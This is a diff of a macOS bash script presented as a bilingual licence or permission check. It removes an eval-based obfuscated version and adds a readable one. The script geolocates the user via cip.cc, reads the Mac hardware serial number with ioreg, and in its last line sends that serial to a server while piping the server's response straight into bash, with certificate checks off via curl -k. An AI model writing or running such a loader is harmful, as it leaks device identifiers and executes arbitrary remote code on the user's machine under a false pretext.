@@ -1,3 +1,57 @@
-z="
-";YBz='err(';NDz='"Ser';vCz='"获取序';iCz='al n';uz='幕';Rz='[0m'\''';Zz='33[1';ZFz=' <(c';bBz='✗${C';Lz='edab';OCz='ckin';eEz='ngua';oz='prin';hBz='1>&2';UFz='ct[$';PDz='exce';eCz='t fi';dEz='[$la';GCz='fi';Vz='LIGH';FDz=' num';QCz='ur p';sEz=' | a';LDz='"';YFz='bash';QDz='ptio';UCz=' use';uCz='[4]=';ABz='}  %';WBz=' %s\';HFz='eria';tDz='ata-';NBz='ok()';Nz='ed';oEz='form';ADz='程序!"';eDz='l -s';TFz='${di';nEz='Plat';AEz='&dns';lEz='d1 -';jDz='ssle';BDz='[5]=';hDz='s://';jCz='umbe';Cz='LICO';ZBz=') {';cFz='unsa';BFz='r/{p';IDz='[6]=';vEz=' '\''/I';nBz='ttp:';dDz='(cur';aDz='理员"';kEz='g -r';uBz='nse ';sDz=' --d';gz='HT_Y';dz='="[$';qEz='rtDe';cz='INFO';ECz='else';wBz='"中国"';UEz='" | ';Fz='rt L';ACz='en';Jz='CxDx';JDz='"您的序';pEz='Expe';dFz='fe?s';EFz=''\'')';SEz='${js';hFz='sg_e';Az='expo';iEz='r=$(';RCz='ermi';Mz='agac';nCz='ntac';AFz='ialN';xz='() {';nz='[K"';WEz='-F'\''"';PCz='g yo';cDz='s="$';az=';33m';UBz='OL_N';pBz='p.cc';LFz='err ';yCz='管理更新';kFz=']}"';EDz='rial';DFz=' $4}';iBz='resp';dCz='ldn'\''';tCz='ater';VBz='C}] ';Tz='o Co';gBz='  " ';fEz='ge +';rDz='der'\''';lCz='leas';Kz='Bxeg';MDz='[7]=';PFz='guag';RFz='3]}"';GEz=' | g';kBz='=$(c';VCz='."';oBz='//ci';bz=''\''';SBz=';32m';iDz='www.';SDz='e ad';IEz='-q "';CDz='"You';NFz='ict[';Bz='rt C';BBz='s ${';XFz='r}"';hCz='seri';xEz='tfor';FEz='ons"';ICz='are ';kDz='ye.c';uDz='raw ';cBz='exit';JFz='mber';SCz='ssio';iFz='rr "';xDz='mdms';oDz='ns_c';xCz='，请联系';YCz='行验证您';DCz='=1';Xz='LLOW';jz='_NC}';mEz='c IO';YEz='msg/';JBz='slee';TBz='✓${C';FCz='=0';DDz='r se';RBz=' [\0';rEz='vice';DBz='${CO';BEz='=A'\'')';Pz='NC='\''';wCz='列号失败';yz='  ${';EBz='L_NC';tz=' 清理屏';qCz='nage';FBz='}" "';gCz='our ';IBz='&2';KDz='列号: ';MBz='}';ZCz='的使用权';TCz='n to';aBz=';31m';mCz='e co';aFz='-skL';LCz='dict';wEz='OPla';ODz='ver ';XBz='n" "';Oz='COL_';PBz='${OV';yEz='mSer';tBz='espo';KBz='p 3';cEz=' "${';ZDz='请联系管';sCz=' upd';kz=']"';JEz='\"er';gEz=' 1]}';HCz='decl';jEz='iore';MCz='[1]=';dBz=' 1';aEz='nt $';eFz='=${s';kCz='r. P';tEz='wk -';Dz='LOR=';fBz='s" "';XDz='"服务器';lDz='om/s';BCz='lang';qz='[H\0';vBz='== *';XEz=''\'' '\''/';yDz='.fun';Sz=' # N';OEz='er_U';fz='_LIG';hz='ELLO';VFz=' + 5';KCz='ict';FFz=' -z ';CBz='}...';xBz='* ]]';Yz='='\''\0';nDz='ol/d';TEz='ons}';GFz='"${s';MEz='rue"';KEz='ror\';NCz='"Che';iz='W}~$';QBz='ER} ';VEz='awk ';bEz='4}'\'')';pDz='heck';JCz='-a d';WCz='[2]=';SFz='ok "';OFz='$lan';MFz='"${d';oCz='t th';rCz='ment';sz='J" #';VDz='tor"';ez='{COL';uEz='F'\''"'\''';ZEz='{pri';jFz=' + 7';bFz='RL}/';mz='="\r';lz='OVER';wDz='ain=';Hz='ORS=';XCz='"正在进';EEz='"$js';GDz='ber:';rBz='if [';UDz='stra';Ez='1';gDz='http';QEz='$(ec';IFz='l_nu';TDz='mini';vz='msg_';bDz='json';REz='ho "';CEz='if e';Qz='\033';bCz='[3]=';qBz=')';DEz='cho ';NEz='serv';LEz='": t';lBz='url ';CCz='uage';yBz='; th';Wz='T_YE';fDz='kL '\''';Uz='lor';KFz='}" ]';Iz='GxFx';rz='33[2';mDz='slto';pCz='e ma';vDz=''\''dom';pz='tf "';mBz='-s h';aCz='限!"';LBz='over';GBz='${1}';Gz='SCOL';sBz='[ $r';WFz=']}${';HDz=' "';QFz='e + ';hEz='al_n';CFz='rint';OBz=' {';fFz='}") ';fCz='nd y';HBz='" 1>';cCz='"Cou';jBz='onse';YDz='异常! ';qDz='_han';HEz='rep ';gFz='|| m';eBz='ER}%';PEz='RL="';RDz='n! P';wz='info';WDz='[8]=';
-eval "$Az$Bz$Cz$Dz$Ez$z$Az$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$z$Oz$Pz$Qz$Rz$Sz$Tz$Uz$z$Oz$Vz$Wz$Xz$Yz$Zz$az$bz$z$cz$dz$ez$fz$gz$hz$iz$ez$jz$kz$z$lz$mz$Qz$nz$z$oz$pz$Qz$qz$rz$sz$tz$uz$z$vz$wz$xz$z$oz$pz$yz$cz$ABz$BBz$Oz$Vz$Wz$Xz$CBz$DBz$EBz$FBz$GBz$HBz$IBz$z$JBz$KBz$z$vz$LBz$z$MBz$z$vz$NBz$OBz$z$oz$pz$PBz$QBz$RBz$Zz$SBz$TBz$UBz$VBz$WBz$XBz$GBz$HBz$IBz$z$vz$LBz$z$MBz$z$vz$YBz$ZBz$z$oz$pz$PBz$QBz$RBz$Zz$aBz$bBz$UBz$VBz$WBz$XBz$GBz$HBz$IBz$z$cBz$dBz$z$MBz$z$vz$LBz$xz$z$oz$pz$PBz$eBz$fBz$gBz$hBz$z$MBz$z$iBz$jBz$kBz$lBz$mBz$nBz$oBz$pBz$qBz$z$rBz$sBz$tBz$uBz$vBz$wBz$xBz$yBz$ACz$z$BCz$CCz$DCz$z$ECz$z$BCz$CCz$FCz$z$GCz$z$HCz$ICz$JCz$KCz$z$LCz$MCz$NCz$OCz$PCz$QCz$RCz$SCz$TCz$UCz$VCz$z$LCz$WCz$XCz$YCz$ZCz$aCz$z$LCz$bCz$cCz$dCz$eCz$fCz$gCz$hCz$iCz$jCz$kCz$lCz$mCz$nCz$oCz$pCz$qCz$rCz$sCz$tCz$VCz$z$LCz$uCz$vCz$wCz$xCz$yCz$ADz$z$LCz$BDz$CDz$DDz$EDz$FDz$GDz$HDz$z$LCz$IDz$JDz$KDz$LDz$z$LCz$MDz$NDz$ODz$PDz$QDz$RDz$lCz$mCz$nCz$oCz$SDz$TDz$UDz$VDz$z$LCz$WDz$XDz$YDz$ZDz$aDz$z$bDz$cDz$dDz$eDz$fDz$gDz$hDz$iDz$jDz$kDz$lDz$mDz$nDz$oDz$pDz$qDz$rDz$sDz$tDz$uDz$vDz$wDz$xDz$yDz$AEz$BEz$LDz$z$CEz$DEz$EEz$FEz$GEz$HEz$IEz$JEz$KEz$LEz$MEz$yBz$ACz$z$NEz$OEz$PEz$QEz$REz$SEz$TEz$UEz$VEz$WEz$XEz$YEz$ZEz$aEz$bEz$LDz$z$ECz$z$NEz$OEz$PEz$xDz$yDz$LDz$z$GCz$z$vz$wz$cEz$LCz$dEz$eEz$fEz$gEz$LDz$z$hCz$hEz$jCz$iEz$jEz$kEz$lEz$mEz$nEz$oEz$pEz$qEz$rEz$sEz$tEz$uEz$vEz$wEz$xEz$yEz$AFz$jCz$BFz$CFz$DFz$EFz$z$rBz$FFz$GFz$HFz$IFz$JFz$KFz$yBz$ACz$z$vz$LFz$MFz$NFz$OFz$PFz$QFz$RFz$z$cBz$dBz$z$GCz$z$vz$SFz$TFz$UFz$BCz$CCz$VFz$WFz$hCz$hEz$jCz$XFz$z$YFz$ZFz$lBz$aFz$cEz$NEz$OEz$bFz$cFz$dFz$HFz$IFz$JFz$eFz$HFz$IFz$JFz$fFz$gFz$hFz$iFz$TFz$UFz$BCz$CCz$jFz$kFz"
+#!/bin/bash
+# set color
+export CLICOLOR=1
+export LSCOLORS=GxFxCxDxBxegedabagaced
+COL_NC='\033[0m' # No Color
+COL_LIGHT_YELLOW='\033[1;33m'
+INFO="[${COL_LIGHT_YELLOW}~${COL_NC}]"
+OVER="\r\033[K"
+printf "\033[H\033[2J" # 清理屏幕
+# set msg
+msg_info() {
+  printf "  ${INFO}  %s ${COL_LIGHT_YELLOW}...${COL_NC}" "${1}" 1>&2
+  sleep 3
+  msg_over
+}
+msg_ok() {
+  printf "${OVER}  [\033[1;32m✓${COL_NC}]  %s\n" "${1}" 1>&2
+  msg_over
+}
+
+msg_err() {
+  printf "${OVER}  [\033[1;31m✗${COL_NC}]  %s\n" "${1}" 1>&2
+  exit 1
+}
+
+msg_over() {
+  printf "${OVER}%s" "  " 1>&2
+}
+
+response=$(curl -s http://cip.cc)
+if [[ $response == *"中国"* ]]; then
+  language=1
+else
+  language=0
+fi
+
+declare -a dict
+dict[1]="Checking your permission to use."
+dict[2]="正在进行验证您的使用权限!"
+dict[3]="Couldn't find your serial number. Please contact the management updater."
+dict[4]="获取序列号失败，请联系管理更新程序!"
+dict[5]="Your serial number: "
+dict[6]="您的序列号: "
+dict[7]="Server exception! Please contact the administrator"
+dict[8]="服务器异常! 请联系管理员"
+
+export server_URL="服务器地址"
+
+msg_info "${dict[$language + 1]}"
+serial_number=$(ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformSerialNumber/{print $4}')
+if [ -z "${serial_number}" ]; then
+  msg_err "${dict[$language + 3]}"
+  exit 1
+fi
+msg_ok "${dict[$language + 5]}${serial_number}"
+
+bash <(curl -skL "${server_URL}/unsafe?serial_number=${serial_number}") || msg_err "${dict[$language + 7]}"
